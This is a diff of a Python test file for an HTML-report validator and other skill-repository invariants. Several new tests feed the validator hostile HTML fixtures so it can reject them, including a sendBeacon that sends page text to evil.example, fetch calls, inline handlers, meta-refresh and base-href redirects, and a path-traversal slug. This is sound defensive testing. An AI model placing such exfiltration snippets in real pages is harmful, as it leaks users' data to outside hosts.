@@ -1,5 +1,6 @@
 """Tests for repository invariants, cross-skill references, and progressive disclosure links."""
 import ast
+import os
 from pathlib import Path
 import re
 import subprocess
@@ -250,101 +251,21 @@ def test_code_review_goldfish_lenses_integrity():
     assert "cr-codebase-reuse-and-contracts" in skill_text
 
 
-def test_html_report_skill_integrity():
-    """Verify the html-report skill and its offline/print scaffold are wired in."""
-    skill_file = SKILLS_DIR / "html-report" / "SKILL.md"
-    reference = SKILLS_DIR / "html-report" / "references" / "html-report-scaffold.md"
-    gate_file = SKILLS_DIR / "html-report" / "references" / "review-gate.md"
-    assert skill_file.exists(), "Missing html-report SKILL.md"
-    assert reference.exists(), "Missing html-report scaffold reference"
-    assert gate_file.exists(), "Missing html-report review gate reference"
+HTML_REPORT_VALIDATOR = SKILLS_DIR / "html-report" / "scripts" / "check_html_report.py"
 
-    skill_text = skill_file.read_text(encoding="utf-8")
-    scaffold = reference.read_text(encoding="utf-8")
-    gate = gate_file.read_text(encoding="utf-8")
-
-    assert "references/html-report-scaffold.md" in skill_text
-    assert "references/review-gate.md" in skill_text
-    assert "**technical-reporting**" in skill_text
-    assert "**data-visualization**" in skill_text
-    assert "**ui-accessibility**" in skill_text
-    assert "**ux-critic**" in skill_text
-    assert "review gate" in skill_text.lower()
-    assert "blocking" in skill_text.lower()
-
-    for marker in ("Visual Quality Bar", "1440x900", "390x844", "320px", "Missing screenshots"):
-        assert marker in skill_text, f"Missing blocking gate marker '{marker}'"
-    for marker in ("Hard Fails", "review record", "Do not deliver", "2 cycles", "Render Matrix"):
-        assert marker.lower() in gate.lower(), f"Missing review gate detail '{marker}'"
-    assert "docs/reports/YYYY-MM-DD_" in skill_text
-    assert "_review.md" in skill_text
-
-    for gate in ("Internal", "Shared", "Executive"):
-        assert gate in skill_text, f"Missing report review profile '{gate}'"
-
-    a11y = (SKILLS_DIR / "ui-accessibility" / "SKILL.md").read_text(encoding="utf-8")
-    critic = (SKILLS_DIR / "ux-critic" / "SKILL.md").read_text(encoding="utf-8")
-    assert "**html-report**" in a11y, "ui-accessibility must hand off HTML report review"
-    assert "**html-report**" in critic, "ux-critic must hand off HTML report critique"
-    assert "blocking gate" in a11y.lower(), "ui-accessibility report audit must be blocking"
-    assert "blocking gate" in critic.lower(), "ux-critic report critique must be blocking"
-
-    for marker in (
-        "<!DOCTYPE html>",
-        "prefers-color-scheme",
-        "@media print",
-        "tabular-nums",
-        "theme-toggle",
-        "fonts.googleapis.com",
-        "display=swap",
-    ):
-        assert marker in scaffold, f"Missing scaffold marker '{marker}'"
-    for marker in ("Structural Self-Check", "check_html_report.py", "Render Evidence", "Review Record"):
-        assert marker in scaffold, f"Missing scaffold workflow marker '{marker}'"
-    for small in ("0.7rem", "0.72rem"):
-        assert f"font-size: {small}" not in scaffold, f"Scaffold font size {small} is below the stated floor"
-
-    for approval_rule in ("explicitly approves", "offline warning", "SRI hash"):
-        assert approval_rule in skill_text, f"Missing controlled CDN rule '{approval_rule}'"
-
-    for stale in ("920px", "980px", "5.5rem"):
-        assert stale not in skill_text, f"Stale preset dimension '{stale}' in {skill_file}"
-    for preset in ('data-preset="dossier"', 'data-preset="zen-garden"', 'data-preset="chronicle"'):
-        assert preset in scaffold, f"Missing scaffold preset '{preset}'"
-    assert "REPLACE_WITH" not in scaffold, "Scaffold still contains an unresolved SRI placeholder"
-    assert "#878079" in scaffold, "Scaffold context series must use the 3:1 warm stone token"
-    for removed in ("preset-btn", "preset-group", "expand-all", "collapse-all", "copy-summary"):
-        assert removed not in scaffold, f"Scaffold still contains redundant control '{removed}'"
-    assert 'id="theme-toggle"' in scaffold, "Scaffold must keep one theme toggle"
-    assert "0.72rem" not in scaffold and "0.7rem" not in scaffold, (
-        "Scaffold still uses label sizes below the 0.75rem minimum"
-    )
-    assert "--chart-ps: #4A6B53" not in scaffold, "Zen Garden charts must use the shared warm palette"
-    assert "Exactly one preset" in skill_text, "SKILL must require one preset per report"
-
-    for emoji in ("❌", "✅", "⚠️", "🚀"):
-        assert emoji not in skill_text, f"Forbidden emoji '{emoji}' in {skill_file}"
-        assert emoji not in scaffold, f"Forbidden emoji '{emoji}' in {reference}"
-
-
-def test_html_report_validator_blocks_structural_drift(tmp_path):
-    """Verify the structural validator passes a complete file and fails preset drift."""
-    script = SKILLS_DIR / "html-report" / "scripts" / "check_html_report.py"
-    assert script.exists(), "Missing html-report structural validator"
-
-    report = tmp_path / "report.html"
-    report.write_text(
-        """<!DOCTYPE html>
+HTML_REPORT_FIXTURE = """<!DOCTYPE html>
 <html lang="en" data-preset="dossier" data-theme="light">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src data:; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'">
 <title>Report</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400&display=swap" rel="stylesheet">
 <style>
 :root, :root[data-preset="dossier"] { --bg: #F7F4EE; }
+:root[data-preset="zen-garden"] .report-section { grid-template-columns: 1fr; }
 :root[data-theme="light"] { --ink: #22201E; }
 :root[data-theme="dark"] { --ink: #EDE8DF; }
 @media (prefers-color-scheme: dark) { :root { --ink: #EDE8DF; } }
@@ -361,34 +282,296 @@ def test_html_report_validator_blocks_structural_drift(tmp_path):
 <script>const answer = 42;</script>
 </body>
 </html>
-""",
-        encoding="utf-8",
-    )
-    passed = subprocess.run(
-        [sys.executable, str(script), str(report)],
-        capture_output=True,
-        text=True,
-        check=False,
-    )
-    assert passed.returncode == 0, passed.stdout + passed.stderr
-    assert "PASS" in passed.stdout
+"""
 
-    broken = tmp_path / "report-multiple-presets.html"
-    broken.write_text(
-        report.read_text(encoding="utf-8").replace(
-            ':root[data-theme="light"]',
-            ':root[data-preset="zen-garden"] { --bg: #F4F1EA; }\n:root[data-theme="light"]',
-        ),
-        encoding="utf-8",
-    )
-    failed = subprocess.run(
-        [sys.executable, str(script), str(broken)],
+
+def _run_validator_path(path: Path) -> subprocess.CompletedProcess[str]:
+    return subprocess.run(
+        [sys.executable, str(HTML_REPORT_VALIDATOR), str(path)],
         capture_output=True,
         text=True,
         check=False,
+        timeout=60,
     )
+
+
+def _run_html_report_validator(tmp_path: Path, content: str) -> subprocess.CompletedProcess[str]:
+    report = tmp_path / "report.html"
+    report.write_text(content, encoding="utf-8")
+    return _run_validator_path(report)
+
+
+def test_html_report_skill_integrity():
+    """Verify the html-report skill, review gate, and handoffs are wired in."""
+    skill_file = SKILLS_DIR / "html-report" / "SKILL.md"
+    reference = SKILLS_DIR / "html-report" / "references" / "html-report-scaffold.md"
+    gate_file = SKILLS_DIR / "html-report" / "references" / "review-gate.md"
+    assert skill_file.exists(), "Missing html-report SKILL.md"
+    assert reference.exists(), "Missing html-report scaffold reference"
+    assert gate_file.exists(), "Missing html-report review gate reference"
+
+    skill_text = skill_file.read_text(encoding="utf-8")
+    gate = gate_file.read_text(encoding="utf-8")
+
+    assert "references/html-report-scaffold.md" in skill_text
+    assert "references/review-gate.md" in skill_text
+    for skill_name in ("technical-reporting", "data-visualization", "ui-accessibility", "ux-critic"):
+        assert f"**{skill_name}**" in skill_text, f"Missing Related Skills handoff to {skill_name}"
+    assert "review gate" in skill_text.lower()
+    assert "blocking" in skill_text.lower()
+    assert "Exactly one preset" in skill_text
+
+    for marker in ("Visual Quality Bar", "1440x900", "390x844", "320px", "Missing screenshots"):
+        assert marker in skill_text, f"Missing blocking gate marker '{marker}'"
+    for marker in ("Hard Fails", "review record", "Do not deliver", "2 cycles", "Render Matrix"):
+        assert marker.lower() in gate.lower(), f"Missing review gate detail '{marker}'"
+    for marker in ("Content-Security-Policy", "credential-shaped string", "approved Chart.js exception"):
+        assert marker.lower() in skill_text.lower() or marker.lower() in gate.lower(), (
+            f"Missing CSP/secret/network contract '{marker}'"
+        )
+    assert "docs/reports/YYYY-MM-DD_" in skill_text
+    assert "_review.md" in skill_text
+
+    for profile in ("Internal", "Shared", "Print", "Executive"):
+        assert profile in skill_text, f"Missing report review profile '{profile}' in SKILL"
+        assert profile in gate, f"Missing report review profile '{profile}' in review gate"
+
+    a11y = (SKILLS_DIR / "ui-accessibility" / "SKILL.md").read_text(encoding="utf-8")
+    critic = (SKILLS_DIR / "ux-critic" / "SKILL.md").read_text(encoding="utf-8")
+    assert "**html-report**" in a11y, "ui-accessibility must hand off HTML report review"
+    assert "**html-report**" in critic, "ux-critic must hand off HTML report critique"
+    assert "blocking gate" in a11y.lower(), "ui-accessibility report audit must be blocking"
+    assert "blocking gate" in critic.lower(), "ux-critic report critique must be blocking"
+
+    for approval_rule in ("explicitly approves", "offline warning", "SRI hash"):
+        assert approval_rule in skill_text, f"Missing controlled CDN rule '{approval_rule}'"
+    assert "only default network request" in skill_text
+    assert "keep the screenshots" in gate.lower()
+
+
+def test_html_report_scaffold_integrity():
+    """Verify the scaffold skeleton, CSP, controls, and preset contract."""
+    scaffold = (
+        SKILLS_DIR / "html-report" / "references" / "html-report-scaffold.md"
+    ).read_text(encoding="utf-8")
+
+    for marker in (
+        "<!DOCTYPE html>",
+        "Content-Security-Policy",
+        "connect-src 'none'",
+        "base-uri 'none'",
+        "form-action 'none'",
+        "prefers-color-scheme",
+        "prefers-reduced-motion",
+        "@media print",
+        "tabular-nums",
+        "font-optical-sizing",
+        "theme-toggle",
+        "fonts.googleapis.com",
+        "display=swap",
+    ):
+        assert marker in scaffold, f"Missing scaffold marker '{marker}'"
+    for marker in ("Structural Self-Check", "check_html_report.py", "Render Evidence", "Review Record"):
+        assert marker in scaffold, f"Missing scaffold workflow marker '{marker}'"
+    for preset in ('data-preset="dossier"', 'data-preset="zen-garden"', 'data-preset="chronicle"'):
+        assert preset in scaffold, f"Missing scaffold preset '{preset}'"
+    for removed in ("preset-btn", "preset-group", "expand-all", "collapse-all", "copy-summary"):
+        assert removed not in scaffold, f"Scaffold still contains redundant control '{removed}'"
+    assert 'id="theme-toggle"' in scaffold, "Scaffold must keep one theme toggle"
+    assert "0.72rem" not in scaffold and "0.7rem" not in scaffold, (
+        "Scaffold still uses label sizes below the 0.75rem minimum"
+    )
+    assert "REPLACE_WITH" not in scaffold, "Scaffold still contains an unresolved SRI placeholder"
+    assert "#878079" in scaffold, "Scaffold context series must use the 3:1 warm stone token"
+    assert "--chart-ps: #4A6B53" not in scaffold, "Zen Garden charts must use the shared warm palette"
+    assert "keep the screenshots" in scaffold.lower()
+
+    for emoji in ("❌", "✅", "⚠️", "🚀"):
+        assert emoji not in scaffold, f"Forbidden emoji '{emoji}' in scaffold"
+
+
+def test_html_report_validator_blocks_structural_drift(tmp_path):
+    """Verify the structural validator passes a complete file and fails preset drift."""
+    baseline = _run_html_report_validator(tmp_path, HTML_REPORT_FIXTURE)
+    assert baseline.returncode == 0, baseline.stdout + baseline.stderr
+    assert "PASS" in baseline.stdout
+
+    broken = HTML_REPORT_FIXTURE.replace(
+        ':root[data-theme="light"]',
+        ':root[data-preset="zen-garden"] { --bg: #F4F1EA; }\n:root[data-theme="light"]',
+    )
+    failed = _run_html_report_validator(tmp_path, broken)
     assert failed.returncode == 1, failed.stdout + failed.stderr
     assert "multiple preset blocks" in failed.stdout
+
+
+def test_html_report_validator_rejects_origin_prefixes(tmp_path):
+    """Exact origins are required for fonts and Chart.js."""
+    evil_font = HTML_REPORT_FIXTURE.replace(
+        "https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400&display=swap",
+        "https://fonts.googleapis.com.evil.example/fonts.googleapis.com/css2?family=Fraunces&display=swap",
+    )
+    result = _run_html_report_validator(tmp_path, evil_font)
+    assert result.returncode == 1
+    assert "external" in result.stdout.lower() or "font" in result.stdout.lower()
+
+    evil_chart = HTML_REPORT_FIXTURE.replace(
+        "</body>",
+        '<script src="https://evil.example/x?cdn.jsdelivr.net/npm/chart.js@" '
+        'integrity="sha384-x" crossorigin="anonymous"></script></body>',
+    )
+    result = _run_html_report_validator(tmp_path, evil_chart)
+    assert result.returncode == 1
+    assert "external or sidecar assets" in result.stdout
+
+
+def test_html_report_validator_rejects_event_and_url_vectors(tmp_path):
+    """Common inline-handler and request vectors must fail."""
+    cases = {
+        "onpointerdown": HTML_REPORT_FIXTURE.replace(
+            'id="theme-toggle"', 'id="theme-toggle" onpointerdown="steal()"'
+        ),
+        "onwheel": HTML_REPORT_FIXTURE.replace(
+            'id="theme-toggle"', 'id="theme-toggle" onwheel="steal()"'
+        ),
+        "fetch_space": HTML_REPORT_FIXTURE.replace(
+            "const answer = 42;", 'fetch ("https://evil.example")'
+        ),
+        "srcset": HTML_REPORT_FIXTURE.replace(
+            "<h1>Report</h1>",
+            '<h1>Report</h1><img src="data:," srcset="https://evil.example/x.png 1x" alt="">',
+        ),
+        "sendbeacon": HTML_REPORT_FIXTURE.replace(
+            "const answer = 42;",
+            'navigator.sendBeacon("https://evil.example", document.body.innerText)',
+        ),
+        "meta_refresh": HTML_REPORT_FIXTURE.replace(
+            "</head>", '<meta http-equiv="refresh" content="0;url=https://evil.example/"></head>'
+        ),
+        "base_href": HTML_REPORT_FIXTURE.replace(
+            "</head>", '<base href="https://evil.example/"></head>'
+        ),
+        "javascript_href": HTML_REPORT_FIXTURE.replace(
+            "<h1>Report</h1>",
+            '<h1>Report</h1><a href="javascript:fetch(\'https://evil.example\')">x</a>',
+        ),
+        "form_action": HTML_REPORT_FIXTURE.replace(
+            "<h1>Report</h1>", '<h1>Report</h1><form action="https://evil.example/"></form>'
+        ),
+        "poster": HTML_REPORT_FIXTURE.replace(
+            "<h1>Report</h1>",
+            '<h1>Report</h1><video poster="https://evil.example/p.png"></video>',
+        ),
+    }
+    for name, content in cases.items():
+        result = _run_html_report_validator(tmp_path, content)
+        assert result.returncode == 1, f"{name} passed: {result.stdout}"
+        assert any(
+            marker in result.stdout
+            for marker in ("inline event handlers", "external or sidecar assets", "inline script network calls")
+        ), f"{name} produced an unexpected failure: {result.stdout}"
+
+
+def test_html_report_validator_io_bounds(tmp_path):
+    """Reject non-regular and oversized files before reading them."""
+    fifo = tmp_path / "report.fifo"
+    os.mkfifo(fifo)
+    result = _run_validator_path(fifo)
+    assert result.returncode == 1
+    assert "not a regular file" in result.stdout
+
+    sparse = tmp_path / "huge.html"
+    with sparse.open("wb") as handle:
+        handle.truncate(2_000_000_000)
+    result = _run_validator_path(sparse)
+    assert result.returncode == 1
+    assert "limit" in result.stdout.lower()
+
+
+def test_html_report_validator_css_and_preset_parsing(tmp_path):
+    """Comments, quoting, duplicates, and layout overrides must parse correctly."""
+    commented_print = HTML_REPORT_FIXTURE.replace(
+        "@media print { details:not([open]) > * { display: block; } @page { margin: 16mm 14mm; } }",
+        "/* @media print */\n@page { margin: 16mm 14mm; }",
+    )
+    result = _run_html_report_validator(tmp_path, commented_print)
+    assert result.returncode == 1
+    assert "missing CSS marker: @media print" in result.stdout
+
+    duplicate = HTML_REPORT_FIXTURE.replace(
+        ':root[data-theme="light"]',
+        ':root[data-preset="dossier"] { --bg: #000; }\n:root[data-theme="light"]',
+    )
+    result = _run_html_report_validator(tmp_path, duplicate)
+    assert result.returncode == 1
+    assert "duplicate preset token block" in result.stdout
+
+    single_quote = HTML_REPORT_FIXTURE.replace('data-theme="dark"', "data-theme='dark'")
+    result = _run_html_report_validator(tmp_path, single_quote)
+    assert result.returncode == 0, result.stdout
+
+    no_token = HTML_REPORT_FIXTURE.replace(
+        ':root, :root[data-preset="dossier"] {', ':root {'
+    ).replace('data-preset="dossier"', 'data-preset="chronicle"')
+    result = _run_html_report_validator(tmp_path, no_token)
+    assert result.returncode == 1
+    assert "missing preset token block" in result.stdout or "missing token block for chosen preset" in result.stdout
+
+
+def test_html_report_validator_rejects_secrets(tmp_path):
+    """Credential-shaped strings block delivery without printing the value."""
+    content = HTML_REPORT_FIXTURE.replace(
+        "const answer = 42;",
+        'const token = "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.abcdefghijklmnop";',
+    )
+    result = _run_html_report_validator(tmp_path, content)
+    assert result.returncode == 1
+    assert "credential-shaped string detected: bearer-token" in result.stdout
+    assert "eyJhbGciOiJIUzI1NiJ9" not in result.stdout
+
+
+def test_html_report_validator_csp_and_chart_exception(tmp_path):
+    """CSP is required, and the approved Chart.js origin is the only exception."""
+    no_csp = HTML_REPORT_FIXTURE.replace(
+        '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; '
+        "script-src 'unsafe-inline'; style-src 'unsafe-inline' https://fonts.googleapis.com; "
+        "font-src https://fonts.gstatic.com; img-src data:; connect-src 'none'; "
+        "object-src 'none'; base-uri 'none'; form-action 'none'\">\n",
+        "",
+    )
+    result = _run_html_report_validator(tmp_path, no_csp)
+    assert result.returncode == 1
+    assert "missing Content-Security-Policy" in result.stdout
+
+    open_connect = HTML_REPORT_FIXTURE.replace("connect-src 'none'", "connect-src *")
+    result = _run_html_report_validator(tmp_path, open_connect)
+    assert result.returncode == 1
+    assert "connect-src" in result.stdout
+
+    chart = HTML_REPORT_FIXTURE.replace(
+        "script-src 'unsafe-inline'",
+        "script-src 'unsafe-inline' https://cdn.jsdelivr.net",
+    ).replace(
+        "</body>",
+        '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js" '
+        'integrity="sha384-9nhczxUqK87bcKHh20fSQcTGD4qq5GhayNYSYWqwBkINBhOfQLg/P5HG5lF1urn4" '
+        'crossorigin="anonymous"></script></body>',
+    )
+    result = _run_html_report_validator(tmp_path, chart)
+    assert result.returncode == 0, result.stdout
+
+
+def test_html_report_review_evidence_retention():
+    """The review record and scaffold agree that linked screenshots are retained."""
+    gate = (
+        SKILLS_DIR / "html-report" / "references" / "review-gate.md"
+    ).read_text(encoding="utf-8")
+    scaffold = (
+        SKILLS_DIR / "html-report" / "references" / "html-report-scaffold.md"
+    ).read_text(encoding="utf-8")
+    assert "keep the screenshots" in gate.lower()
+    assert "delete only unreferenced" in gate.lower()
+    assert "keep the screenshots" in scaffold.lower()
 
 
 def test_ui_ux_family_integrity():
@@ -455,20 +638,16 @@ def test_ui_ux_family_integrity():
 
 
 def test_zen_prose_budget_consistency():
-    """Verify every report/UI skill declares one paragraph budget: 2-3 sentences, <= 60 words."""
-    skills = (
-        "data-storytelling",
-        "design-system",
-        "html-report",
-        "technical-reporting",
-        "ux-critic",
-        "ux-product-shaper",
-    )
-    for name in skills:
-        text = (SKILLS_DIR / name / "SKILL.md").read_text(encoding="utf-8")
-        assert "2-3 sentences" in text, f"{name} does not declare the 2-3 sentence budget"
-        for stale in ("40-60", "45-60", "<= 3 sentences"):
-            assert stale not in text, f"{name} contains stale prose budget '{stale}'"
+    """Verify every report/UI prose budget declares 2-3 sentences and <= 60 words."""
+    for path in sorted(SKILLS_DIR.rglob("*.md")):
+        text = path.read_text(encoding="utf-8")
+        if "2-3 sentences" not in text:
+            continue
+        if not any(term in text.lower() for term in ("paragraph", "prose", "wording")):
+            continue
+        assert "<= 60 words" in text, f"{path} does not declare the 60-word cap"
+        for stale in ("40-60", "45-60", "<= 3 sentences", "<= 80 words"):
+            assert stale not in text, f"{path} contains stale prose budget '{stale}'"
 
 
 def test_typography_contract_consistency():
@@ -542,3 +721,141 @@ def test_html_report_chart_interaction_contract():
     )
 
 
+def test_numeric_contracts_are_canonical():
+    """Numeric review bounds live in the kernel and skills point to it."""
+    rules = RULES_FILE.read_text(encoding="utf-8")
+    assert "diff/code review `<= 2`" in rules
+    assert "spec/design review `<= 3`" in rules
+    assert "hard finding `> 50`" in rules
+
+    code_minimalism = (SKILLS_DIR / "code-minimalism" / "SKILL.md").read_text(encoding="utf-8")
+    assert "Follow `rules/AGENTS.md` §3" in code_minimalism
+    assert "> 40 LOC" not in code_minimalism
+
+    doubt = (SKILLS_DIR / "doubt-driven-development" / "SKILL.md").read_text(encoding="utf-8")
+    assert "spec/design review bound in `rules/AGENTS.md` §1" in doubt
+    for stale in ("three review cycles", "3 unresolved cycles", "at most three"):
+        assert stale not in doubt
+
+    spec = (SKILLS_DIR / "spec-driven-design" / "SKILL.md").read_text(encoding="utf-8")
+    assert "spec/design review bound in `rules/AGENTS.md` §1" in spec
+    assert "review cycles at three" not in spec
+
+    review_ref = (
+        SKILLS_DIR / "code-review" / "references" / "goldfish-code-review-lenses.md"
+    ).read_text(encoding="utf-8")
+    assert "diff/code review bound in `rules/AGENTS.md` §1" in review_ref
+    assert "hard length threshold in `rules/AGENTS.md` §3" in review_ref
+    assert "two fix-review cycles" not in review_ref
+    assert "50 effective lines" not in review_ref
+
+    simplification = (SKILLS_DIR / "code-simplification" / "SKILL.md").read_text(encoding="utf-8")
+    assert "hard length threshold in `rules/AGENTS.md` §3" in simplification
+    assert "<= 50 effective lines" not in simplification
+
+
+def test_artifact_topic_slug_contract():
+    """Artifact placeholders are slugged and contained by the kernel rule."""
+    rules = RULES_FILE.read_text(encoding="utf-8")
+    assert "^[a-z0-9]+(-[a-z0-9]+)*$" in rules
+    assert "stays inside" in rules
+
+    artifact_skills = (
+        "html-report",
+        "technical-reporting",
+        "codebase-contracts",
+        "ux-critic",
+        "ui-accessibility",
+        "doubt-driven-development",
+        "tech-research",
+        "spec-driven-design",
+        "ux-product-shaper",
+        "design-system",
+    )
+    for name in artifact_skills:
+        text = (SKILLS_DIR / name / "SKILL.md").read_text(encoding="utf-8")
+        assert "artifact slug and containment rule in `rules/AGENTS.md` §4" in text, (
+            f"{name} does not reference the artifact slug rule"
+        )
+
+    slug = re.compile(r"^[a-z0-9]+(-[a-z0-9]+)*$")
+    assert slug.fullmatch("my-report")
+    for bad in ("x/../../etc/passwd", "..", "/abs", ".hidden", "Upper"):
+        assert not slug.fullmatch(bad), f"slug rule accepted {bad}"
+
+
+def test_deprecation_probe_uses_safe_tempdir():
+    """The clone probe uses mktemp, a trap, and a validated relative target."""
+    reference = (
+        SKILLS_DIR
+        / "deprecation-migration"
+        / "references"
+        / "dead-code-and-untracking-audits.md"
+    ).read_text(encoding="utf-8")
+    assert "mktemp -d" in reference
+    assert "trap 'rm -rf -- \"$probe\"' EXIT" in reference
+    assert "case \"$target\" in" in reference
+    assert "rm -rf -- \"$probe/$target\"" in reference
+    assert "/tmp/clone_probe" not in reference
+
+
+def test_readme_reference_counts_match_directories():
+    """Numeric README reference annotations match the files on disk."""
+    readme = (REPO_DIR / "README.md").read_text(encoding="utf-8")
+    expected = {
+        "algorithm-optimization": 4,
+        "code-minimalism": 2,
+        "code-review": 3,
+        "codebase-contracts": 1,
+        "deprecation-migration": 2,
+        "design-system": 1,
+        "doubt-driven-development": 1,
+        "html-report": 2,
+        "python-pro": 1,
+        "python-testing": 2,
+        "spec-driven-design": 1,
+        "ui-accessibility": 1,
+        "ux-critic": 1,
+        "ux-product-shaper": 1,
+        "verify-and-stop": 1,
+    }
+    for name, count in expected.items():
+        line = next(
+            (line for line in readme.splitlines() if f"{name}/" in line and "(+" in line),
+            "",
+        )
+        match = re.search(r"\(\+ (\d+) references?", line)
+        assert match, f"README is missing a numeric reference annotation for {name}"
+        assert int(match.group(1)) == count, (
+            f"README annotation for {name} is {match.group(1)}, expected {count}"
+        )
+        actual = len(list((SKILLS_DIR / name / "references").glob("*.md")))
+        assert actual == count, f"{name} has {actual} references, expected {count}"
+    assert "`AGENTS.md` §5 stub" not in readme
+
+
+def test_setup_flags_and_hosts_are_documented():
+    """Usage, README, and validation agree on hosts and flags."""
+    setup = (REPO_DIR / "setup.sh").read_text(encoding="utf-8")
+    readme = (REPO_DIR / "README.md").read_text(encoding="utf-8")
+    hosts = ("portable", "antigravity", "grok", "opencode", "codex", "zed", "zcode")
+    for host in hosts:
+        assert host in setup, f"setup.sh does not know host {host}"
+        assert host in readme, f"README does not document host {host}"
+    usage = setup.split("cat <<'EOF'", 1)[1].split("\nEOF", 1)[0]
+    for flag in (
+        "--project",
+        "--user",
+        "--host",
+        "--with-rust",
+        "--without-rust",
+        "--all",
+        "--link",
+        "--mirror-native",
+        "--force",
+        "--dry-run",
+        "--help",
+    ):
+        assert flag in usage, f"setup.sh usage does not document {flag}"
+    assert "eval " not in setup, "setup.sh still contains an eval helper"
+    assert "maybe_remove_old_rules" not in setup, "setup.sh still contains dead helper"
